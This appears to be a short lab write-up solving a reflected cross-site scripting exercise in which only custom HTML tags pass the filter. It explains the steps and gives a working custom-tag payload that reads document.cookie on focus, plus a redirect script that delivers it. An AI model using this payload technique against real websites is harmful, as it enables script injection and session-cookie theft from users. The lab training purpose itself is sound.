@@ -1,0 +1,36 @@
+This lab blocks all HTML tags except custom ones
+
+custom tag  that we will use  document.cookie
+
+
+
+Step-1:
+
+for testing to see if its works we need first search anything in the search bar and add this line in the url Search result 
+
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+
+
+This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called
+
+Step-2:
+
+If we see its working than copy the whole url
+
+https://0a70009003926bb881dfd458003e0048.web-security-academy.net/?search=%3Cxss%20id=x%20onfocus=alert(document.cookie)%20tabindex=1%3E#x
+
+Step-3:
+
+The Solution
+
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+
+<script>
+location = 'https://0a70009003926bb881dfd458003e0048.web-security-academy.net/?search=%3Cxss%20id=x%20onfocus=alert(document.cookie)%20tabindex=1%3E#x';
+</script>
+
+
+
